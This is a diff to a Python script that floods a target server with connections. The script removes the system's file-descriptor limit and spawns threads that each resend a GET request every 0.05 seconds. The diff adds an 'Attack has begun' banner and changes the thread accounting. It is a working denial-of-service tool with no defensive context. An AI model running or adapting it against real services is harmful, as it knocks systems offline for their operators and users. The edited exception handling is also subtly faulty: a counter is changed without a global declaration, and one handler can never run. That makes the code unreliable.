@@ -19,7 +19,8 @@ NETWORK_UNREACHABLE = 51
 #allows us to dictate the number of threads we want to start
 numThreads = 0
 
-#allows us to start more threads above what would be the normal limit for your system: basically it lets us do as much as your computer can handle
+#allows us to start more threads above what would be the normal limit for your system
+#basically it lets us do as much as your computer can handle
 resource.setrlimit(resource.RLIMIT_NOFILE, (resource.RLIM_INFINITY,resource.RLIM_INFINITY))
 
 #extrats cl arguments
@@ -33,6 +34,7 @@ if len(sys.argv) == 4:
     
     #How many connections we intend to open
     numConnections = int(sys.argv[3])
+
 else:
 
     #If user didn't format arguments correctly, quit program
@@ -58,42 +60,22 @@ def singleThread():
             #Continually sends the request every time interval
             time.sleep(.05)
             clientSocket.send('GET '.encode() +req.encode() +'\r\n\r\n'.encode())
-#
-##            message = clientSocket.recv(1000)
-##            print(message)
-##            while message:
-##                #print(message.decode())
-##                message = clientSocket.recv(1000)
-#
-#
-#    #these exceptions may happen if there are too many concurrent threads/there is a connection issue
-    
-    
+
+    #these exceptions may happen if there are too many concurrent threads/there is a connection issue
     except ConnectionResetError:
         print('Connection reset by host')
-        pass
-#    except OSError as e:
-#        if e.errorno == NETWORK_UNREACHABLE:
-#            print('Congrats, the network cannot be reached')
+        numThreads-=1
+    except OSError as e:
+        numThreads-=1
     except BrokenPipeError:
         print('Broken pipe: you may be starting too many threads too quickly. Increase the delay between threads')
-        pass
-
-# a different threading method, produces similar results
-#attackThreads = []
-#for i in range(numConnections):
-#    t = threading.Thread(target=singleThread)
-#    t.start()
-#    attackThreads.append(t)
-#    time.sleep(.01)
-#
-#for thrd in attackThreads:
-#    thrd.join()
+        numThreads-=1
 
 #Opens the wanted number of connections
+print('Attack has begun. Press ^C to quit.\n')
 while numThreads < numConnections:
-    #print(str(numThreads))
+
     #starts a new single thread and then sleeps an appropriate ammt of time
     start_new_thread(singleThread, ())
-    time.sleep(.01)
+    time.sleep(.05)
     numThreads+=1
